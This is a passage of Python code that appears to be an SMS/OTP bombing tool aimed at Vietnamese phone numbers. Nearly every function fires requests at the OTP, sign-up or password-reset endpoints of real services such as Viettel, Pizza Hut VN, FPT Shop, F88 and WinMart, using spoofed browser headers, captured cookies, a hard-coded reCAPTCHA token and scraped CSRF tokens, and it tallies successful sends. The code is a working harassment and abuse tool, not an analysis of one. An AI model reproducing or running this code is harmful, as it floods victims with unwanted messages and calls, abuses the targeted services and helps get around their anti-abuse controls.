        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
        'phone': f'{sdt}',
        'type': '2',
        'ctype': '1',
        'chntoken': 'e51d233aa164cb9ec126578fc2d553f6',
    }
    response = requests.post('https://api.kimungvay.co/h5/LoginMessage_ultimate', headers=headers, data=data)
    if 'successfully' in response.text:
      thanhcong+=1
    else:
      thatbai+=1
def call12(sdt):
  letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
  random1 = random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters)
  for x in random1:
    a = x+"@gmail.com" 
  headers = {
    'Host': 'cashberry.vn',
    # 'content-length': '1170',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://cashberry.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://cashberry.vn/dang-ky',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'cashberry_new_nuxt_front=vn; site_id=1f21f685be4e9ac1d9dde54d64a5ee30; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=wLU0zLsWJMCSuaFRsEAMR9lS8ymsmsZlauYDdKY58gA=; _ga=GA1.1.453475758.1691890639; _fbp=fb.1.1691890639098.1672690554; _lr_hb_-bdwvky%2Fcashberry-vn={%22heartbeat%22:1691890639757}; _lr_uf_-bdwvky=6e4dc5a7-23fc-4687-9efe-b0d1ea7ebdf2; _lr_tabs_-bdwvky%2Fcashberry-vn={%22sessionID%22:0%2C%22recordingID%22:%225-5d2ee190-bf44-4420-bbcf-69d94bc1229c%22%2C%22webViewID%22:null%2C%22lastActivity%22:1691890645656}; _ga_53M1222GXQ=GS1.1.1691890638.1.1.1691890649.0.0.0',
}
  data = '{"phone":"sdt","inn":"583805682558","email":"email11","password":"12345Gdtg@","password_repeat":"12345Gdtg@","agree":true,"is_confirmed_kyivstar":1,"email_mailing":1,"registrationActionsReport":{"Object_1":{"Keypress":null,"Activate":1,"TimeLast":3,"TimeAll":60,"SymbolFact":10,"Copy":null,"Paste":null,"Click":1,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":1,"Error":17},"Object_2":{"Keypress":null,"Activate":null,"TimeLast":null,"TimeAll":null,"SymbolFact":19,"Copy":null,"Paste":null,"Click":null,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":null,"Error":4},"Object_3":{"Activate":1,"TimeLast":6,"TimeAll":6,"SymbolFact":10,"Paste":null,"Click":1,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":1,"Error":null},"Object_15":{"Keypress":null,"Activate":null,"TimeLast":null,"TimeAll":null,"SymbolFact":null,"Copy":null,"Paste":null,"Click":null,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":null,"Error":null},"Object_41":{"Activate":null,"Changes":null,"Error":null}}}'.replace('email11',a)
  data = data.replace('sdt',sdt)
  response = requests.post('https://cashberry.vn/proxy/user/register', headers=headers, data=data)
def call13(sdt):
  global thanhcong
  global thatbai
  headers = {
    'Host': 'lk.takomo.vn',
    # 'content-length': '63',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://lk.takomo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.1322990889.1691892176; _gid=GA1.2.1712469938.1691892180; _gat_UA-187725374-2=1; _hjFirstSeen=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6IjRkMTM2YmI3LWMwZTMtNDViYi04Y2RlLWVmZTEwMDNjOTcyMSIsImNyZWF0ZWQiOjE2OTE4OTIxODI5OTEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1691892183149.361720121; _tt_enable_cookie=1; _ttp=rolXX5eW4teiY32zQW6AhD4vgnU; _fw_crm_v=c75bd27f-15ee-4b55-c659-dcb46da7d3e8; _hjSessionUser_2281843=eyJpZCI6IjBkZmZkMTM5LTdkYzYtNTQ1OS04Njg5LTNmYmMwZjg4YjIyNSIsImNyZWF0ZWQiOjE2OTE4OTIxODI5MTAsImV4aXN0aW5nIjp0cnVlfQ==; _ga_K15C064VTW=GS1.2.1691892186.1.1.1691892195.51.0.0; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDMzODYwNzI0NQ.AuMP_7aZ-Nzl2IRO_r4s-uc-YPsmrSqJGHqyMw_WMQ8; _gat_UA-187725374-1=1; _ga=GA1.1.2029320197.1691892180; _ga_ZN0EBP68G5=GS1.1.1691892223.1.0.1691892224.59.0.0; _ga_ZBQ18M247M=GS1.1.1691892181.1.1.1691892225.16.0.0; _ga_03H0F9NHEX=GS1.2.1691892225.1.0.1691892226.59.0.0',
}
  data = '{"data":{"phone":"sdt","code":"resend","channel":"ivr"}}'.replace('sdt',sdt)
  response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', headers=headers, data=data).text
  if 'ok' in response:
    thanhcong+=1
  else:
    thatbai+=1

#sms 0
def sms0(phone):
    global thanhcong
    cookies = {
        'x_polaris_sid': 'BWZFTerIutSge4HMv5i8bKgbGbLTjLa6FL8T',
        '_gcl_au': '1.1.1902092237.1693622841',
        'ab.storage.deviceId.316e45bf-b91c-442f-b994-c4275917d31b': '%7B%22g%22%3A%2299140ba9-a451-4f4b-3b88-000d9fc24400%22%2C%22c%22%3A1693622841220%2C%22l%22%3A1693622841220%7D',
        '_gid': 'GA1.2.1289707108.1693622845',
        '_gat_UA-197055535-1': '1',
        '_gat_UA-197055535-2': '1',
        '_tt_enable_cookie': '1',
        '_ttp': '7f06LQXYr6nT9sc_4psOjy7KJtJ',
        'fs_lua': '1.1693622847471',
        'fs_uid': '#o-1EGZPD-na1#0feb23d0-7366-47fd-9ec0-2020910d4f92:1c233869-2692-4490-a46a-6ef1a7750f60:1693622847471::1#/1725158845',
        '_ga': 'GA1.2.1997180896.1693622845',
        'ab.storage.sessionId.316e45bf-b91c-442f-b994-c4275917d31b': '%7B%22g%22%3A%2234510877-a44c-8b36-d54b-008a98eff3d3%22%2C%22e%22%3A1693624652144%2C%22c%22%3A1693622841187%2C%22l%22%3A1693622852144%7D',
        '_ga_VLLXGWD25W': 'GS1.1.1693622845.1.1.1693622854.0.0.0',
        '_ga_Q17PXF17Y5': 'GS1.1.1693622845.1.1.1693622892.0.0.0',
        'x_polaris_sd': 'A/zH2h18cY11OCWg9hNU2wgcnzEWiVaVoXrBZoOO5nOm31W/Afx2Aaj4bop/Bo6oqYKAF8k0im4UgEe5FBey8SUzRJv2QLrXE5tiyvDiE6atl2jlAqq5eQVenoLyVzGE',
    }

    headers = {
        'authority': 'pizzahut.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        # 'cookie': 'x_polaris_sid=BWZFTerIutSge4HMv5i8bKgbGbLTjLa6FL8T; _gcl_au=1.1.1902092237.1693622841; ab.storage.deviceId.316e45bf-b91c-442f-b994-c4275917d31b=%7B%22g%22%3A%2299140ba9-a451-4f4b-3b88-000d9fc24400%22%2C%22c%22%3A1693622841220%2C%22l%22%3A1693622841220%7D; _gid=GA1.2.1289707108.1693622845; _gat_UA-197055535-1=1; _gat_UA-197055535-2=1; _tt_enable_cookie=1; _ttp=7f06LQXYr6nT9sc_4psOjy7KJtJ; fs_lua=1.1693622847471; fs_uid=#o-1EGZPD-na1#0feb23d0-7366-47fd-9ec0-2020910d4f92:1c233869-2692-4490-a46a-6ef1a7750f60:1693622847471::1#/1725158845; _ga=GA1.2.1997180896.1693622845; ab.storage.sessionId.316e45bf-b91c-442f-b994-c4275917d31b=%7B%22g%22%3A%2234510877-a44c-8b36-d54b-008a98eff3d3%22%2C%22e%22%3A1693624652144%2C%22c%22%3A1693622841187%2C%22l%22%3A1693622852144%7D; _ga_VLLXGWD25W=GS1.1.1693622845.1.1.1693622854.0.0.0; _ga_Q17PXF17Y5=GS1.1.1693622845.1.1.1693622892.0.0.0; x_polaris_sd=A/zH2h18cY11OCWg9hNU2wgcnzEWiVaVoXrBZoOO5nOm31W/Afx2Aaj4bop/Bo6oqYKAF8k0im4UgEe5FBey8SUzRJv2QLrXE5tiyvDiE6atl2jlAqq5eQVenoLyVzGE',
        'dnt': '1',
        'origin': 'https://pizzahut.vn',
        'referer': 'https://pizzahut.vn/signup',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'keyData': f'appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone={phone}',
    }

    response = requests.post(
        'https://pizzahut.vn/callApiStorelet/user/registerRequest',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    thanhcong+=1
def pizza(phone):
    global thanhcong
    cookies = {
        'x_polaris_sid': 'BWZFTerIutSge4HMv5i8bKgbGbLTjLa6FL8T',
        '_gcl_au': '1.1.1902092237.1693622841',
        'ab.storage.deviceId.316e45bf-b91c-442f-b994-c4275917d31b': '%7B%22g%22%3A%2299140ba9-a451-4f4b-3b88-000d9fc24400%22%2C%22c%22%3A1693622841220%2C%22l%22%3A1693622841220%7D',
        '_gid': 'GA1.2.1289707108.1693622845',
        '_gat_UA-197055535-1': '1',
        '_gat_UA-197055535-2': '1',
        '_tt_enable_cookie': '1',
        '_ttp': '7f06LQXYr6nT9sc_4psOjy7KJtJ',
        'fs_lua': '1.1693622847471',
        'fs_uid': '#o-1EGZPD-na1#0feb23d0-7366-47fd-9ec0-2020910d4f92:1c233869-2692-4490-a46a-6ef1a7750f60:1693622847471::1#/1725158845',
        '_ga': 'GA1.2.1997180896.1693622845',
        'ab.storage.sessionId.316e45bf-b91c-442f-b994-c4275917d31b': '%7B%22g%22%3A%2234510877-a44c-8b36-d54b-008a98eff3d3%22%2C%22e%22%3A1693624652144%2C%22c%22%3A1693622841187%2C%22l%22%3A1693622852144%7D',
        '_ga_VLLXGWD25W': 'GS1.1.1693622845.1.1.1693622854.0.0.0',
        '_ga_Q17PXF17Y5': 'GS1.1.1693622845.1.1.1693622892.0.0.0',
        'x_polaris_sd': 'A/zH2h18cY11OCWg9hNU2wgcnzEWiVaVoXrBZoOO5nOm31W/Afx2Aaj4bop/Bo6oqYKAF8k0im4UgEe5FBey8SUzRJv2QLrXE5tiyvDiE6atl2jlAqq5eQVenoLyVzGE',
    }

    headers = {
        'authority': 'pizzahut.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        # 'cookie': 'x_polaris_sid=BWZFTerIutSge4HMv5i8bKgbGbLTjLa6FL8T; _gcl_au=1.1.1902092237.1693622841; ab.storage.deviceId.316e45bf-b91c-442f-b994-c4275917d31b=%7B%22g%22%3A%2299140ba9-a451-4f4b-3b88-000d9fc24400%22%2C%22c%22%3A1693622841220%2C%22l%22%3A1693622841220%7D; _gid=GA1.2.1289707108.1693622845; _gat_UA-197055535-1=1; _gat_UA-197055535-2=1; _tt_enable_cookie=1; _ttp=7f06LQXYr6nT9sc_4psOjy7KJtJ; fs_lua=1.1693622847471; fs_uid=#o-1EGZPD-na1#0feb23d0-7366-47fd-9ec0-2020910d4f92:1c233869-2692-4490-a46a-6ef1a7750f60:1693622847471::1#/1725158845; _ga=GA1.2.1997180896.1693622845; ab.storage.sessionId.316e45bf-b91c-442f-b994-c4275917d31b=%7B%22g%22%3A%2234510877-a44c-8b36-d54b-008a98eff3d3%22%2C%22e%22%3A1693624652144%2C%22c%22%3A1693622841187%2C%22l%22%3A1693622852144%7D; _ga_VLLXGWD25W=GS1.1.1693622845.1.1.1693622854.0.0.0; _ga_Q17PXF17Y5=GS1.1.1693622845.1.1.1693622892.0.0.0; x_polaris_sd=A/zH2h18cY11OCWg9hNU2wgcnzEWiVaVoXrBZoOO5nOm31W/Afx2Aaj4bop/Bo6oqYKAF8k0im4UgEe5FBey8SUzRJv2QLrXE5tiyvDiE6atl2jlAqq5eQVenoLyVzGE',
        'dnt': '1',
        'origin': 'https://pizzahut.vn',
        'referer': 'https://pizzahut.vn/signup',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'keyData': f'appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone={phone}',
    }

    response = requests.post(
        'https://pizzahut.vn/callApiStorelet/user/registerRequest',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    thanhcong+=1
#sms 1
def sms1(phone):
    global thanhcong
    global thatbai
    cookies = {'_gcl_au': '1.1.1234341675.1686922968','_tt_enable_cookie': '1','_ttp': 'WyNAskSGc-MRWecC-x4AoVux6yP','_ym_uid': '1686922982967271010','_ym_d': '1686922982','_ga_P2783EHVX2': 'GS1.1.1687052163.3.0.1687052163.60.0.0','_ga': 'GA1.1.1535606375.1686922968',}
    headers = {'authority': 'api.vayvnd.vn','accept': 'application/json','accept-language': 'vi-VN','content-type': 'application/json; charset=utf-8','dnt': '1','origin': 'https://vayvnd.vn','referer': 'https://vayvnd.vn/','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','site-id': '3','user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',}
    json_data = {'login': phone,}
    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
    if "true" in response.text:
            thanhcong +=1
    else:
            thatbai+=1
#sms 2
def sms2(phone):
    global thanhcong
    global thatbai
    cookies = {
        'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '49eb18d9-d110-4043-8ad4-7275d8b8d2e7',
        '_gcl_au': '1.1.810434433.1689606249',
        'fpt_uuid': '%226a6dc316-0db3-44a0-8891-224623887942%22',
        'ajs_group_id': 'null',
        '_tt_enable_cookie': '1',
        '_ttp': '8uDshq4oYRcpPmQFUdKlNsoewGP',
        '__admUTMtime': '1689606251',
        '__uidac': '9d45aa00b705e4c9ff20708ca0955e4f',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '_gid': 'GA1.3.1682465247.1691155413',
        '_gat': '1',
        '_ga': 'GA1.1.1211624965.1689606248',
        'vMobile': '1',
        '__zi': '3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpftKyLnd-SeEpVIXt1DvokvPf97yizcQtaDp0.1',
        'cf_clearance': 'm4Jw8L0YfcX1sOo1SwE_jMGACjNFcJ0fu_5BSusrDew-1691155422-0-1-386b1bcb.29faee9a.6f6a442b-0.2.1691155422',
        '_hjSessionUser_731679': 'eyJpZCI6ImIzZDQ0ZDBlLTFlMTUtNThhNS1iNzU1LWM5ODdjZmYzMTkxMyIsImNyZWF0ZWQiOjE2ODk2MDYyNTIyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjIncludedInSessionSample_731679': '0',
        '_hjSession_731679': 'eyJpZCI6ImJkOTcxOTVjLTM1Y2EtNDg1OC1hMDA1LTFmOWIxYzc3M2VjNiIsImNyZWF0ZWQiOjE2OTExNTU0MTg5NjksImluU2FtcGxlIjpmYWxzZX0=',
        '_ga_ZR815NQ85K': 'GS1.1.1691155413.2.0.1691155423.50.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=49eb18d9-d110-4043-8ad4-7275d8b8d2e7; _gcl_au=1.1.810434433.1689606249; fpt_uuid=%226a6dc316-0db3-44a0-8891-224623887942%22; ajs_group_id=null; _tt_enable_cookie=1; _ttp=8uDshq4oYRcpPmQFUdKlNsoewGP; __admUTMtime=1689606251; __uidac=9d45aa00b705e4c9ff20708ca0955e4f; __iid=; __iid=; __su=0; __su=0; _gid=GA1.3.1682465247.1691155413; _gat=1; _ga=GA1.1.1211624965.1689606248; vMobile=1; __zi=3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpftKyLnd-SeEpVIXt1DvokvPf97yizcQtaDp0.1; cf_clearance=m4Jw8L0YfcX1sOo1SwE_jMGACjNFcJ0fu_5BSusrDew-1691155422-0-1-386b1bcb.29faee9a.6f6a442b-0.2.1691155422; _hjSessionUser_731679=eyJpZCI6ImIzZDQ0ZDBlLTFlMTUtNThhNS1iNzU1LWM5ODdjZmYzMTkxMyIsImNyZWF0ZWQiOjE2ODk2MDYyNTIyMTEsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6ImJkOTcxOTVjLTM1Y2EtNDg1OC1hMDA1LTFmOWIxYzc3M2VjNiIsImNyZWF0ZWQiOjE2OTExNTU0MTg5NjksImluU2FtcGxlIjpmYWxzZX0=; _ga_ZR815NQ85K=GS1.1.1691155413.2.0.1691155423.50.0.0',
        'DNT': '1',
        'Origin': 'https://fptshop.com.vn',
        'Referer': 'https://fptshop.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': phone,
        'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
    if '"error":false,'in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 3
def sms3(phone):
    global thanhcong
    global thatbai
    headers = {'Host': 'api.f88.vn','accept': 'application/json, text/plain, */*','content-encoding': 'gzip','user-agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36','content-type': 'application/json','origin': 'https://online.f88.vn','referer': 'https://online.f88.vn/',}
    data = {'phoneNumber': phone,'recaptchaResponse': '03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO','source': 'Online'}
    response = requests.post('https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP', json=data, headers=headers)
    access = response.json()
    thanhcong+=1
#sms 4
def sms4(phone):
    global thanhcong
    global thatbai
    headers = {'Host': 'vietteltelecom.vn','Connection': 'keep-alive','X-CSRF-TOKEN': 'mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I','User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Accept': 'application/json, text/plain, */*','Referer': 'https://vietteltelecom.vn/dang-nhap',}
    data = {'phone': phone,'type': ''}
    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', json=data, headers=headers)
    result = response.json()
    thanhcong+=1
#sms 5
def sms5(phone):
    global thanhcong
    global thatbai
    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn',}
    response = requests.get('https://viettel.vn/dang-ky', headers=headers)
    token = response.text.split('name="csrf-token" content="')[1].split('"')[0]
    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-XSRF-TOKEN': token,'X-CSRF-TOKEN': token,'X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap',}
    data = {'msisdn': phone}
    response = requests.post('https://viettel.vn/api/get-otp', json=data, headers=headers)
    result = response.json()
    thanhcong+=1
#sms 7
def sms7(phone):
    global thanhcong
    global thatbai
    headers = {
        'authority': 'api-crownx.winmart.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'access-control-request-headers': 'authorization',
        'access-control-request-method': 'GET',
        'origin': 'https://winmart.vn',
        'referer': 'https://winmart.vn/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    }

    params = {
        'phoneNo': phone,
    }

    response = requests.options('https://api-crownx.winmart.vn/as/api/web/v1/send-otp', params=params, headers=headers)

    if "true" in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 8
def sms8(phone):
  global thanhcong
  global thatbai
  def random_string(length):
      import random
      characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
      result = ""
      for _ in range(length):
          result += random.choice(characters)
      return result
  alo=random_string(8)
  ten=random_string(4)
  phone = '0' + phone
  phone = phone.replace('00','')
  phone12 = '+84' + phone
  cookies = {'ads': 'www.google.com','refcode': '746','time_referer': '1689061704','kvas-uuid': '3a85af4a-1908-48f2-980d-d15395992de5','kvas-uuid-d': '1686469706132','gkvas-uuid': 'fc23dc65-4af3-4711-8198-90a46e6b0ca1','gkvas-uuid-d': '1686469706134','kv-session': '94e736d4-493e-4656-9a6a-266817374182','_hjFirstSeen': '1','_hjIncludedInSessionSample_563959': '1','_hjSession_563959': 'eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==','_gid': 'GA1.2.1638977009.1686469708','_tt_enable_cookie': '1','_ttp': 'KrXyjN8UQfZPEg6udl4pOmk7Tnd','_gac_UA-158809353-1': '1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE','_gac_UA-64814867-1': '1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE','source_referer': '%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D','kv-session-d': '1686469712238','_hjSessionUser_563959': 'eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==','parent': '77','_ga': 'GA1.2.1398574114.1686469708','_ga_6HE3N545ZW': 'GS1.1.1686469708.1.1.1686469715.53.0.0','_fw_crm_v': '4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',}
  headers = {'authority': 'www.kiotviet.vn','accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','dnt': '1','origin': 'https://www.kiotviet.vn','referer': 'https://www.kiotviet.vn/dang-ky/?refcode=746','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
  data = {'phone': phone12,'code': alo,'name': 'lê van sang','email': '','zone': 'An Giang - Huyện Châu Phú','merchant': 'muabansi','username': phone,'industry': 'Thời trang','ref_code': '746','industry_id': '77','phone_input': phone,}
  response = requests.post('https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',cookies=cookies,headers=headers,data=data,)
  if 'success' in response.text:
    thanhcong+=1
  else:
    thatbai+=1
#sms 10
def sms10(phone):
    global thanhcong
    global thatbai
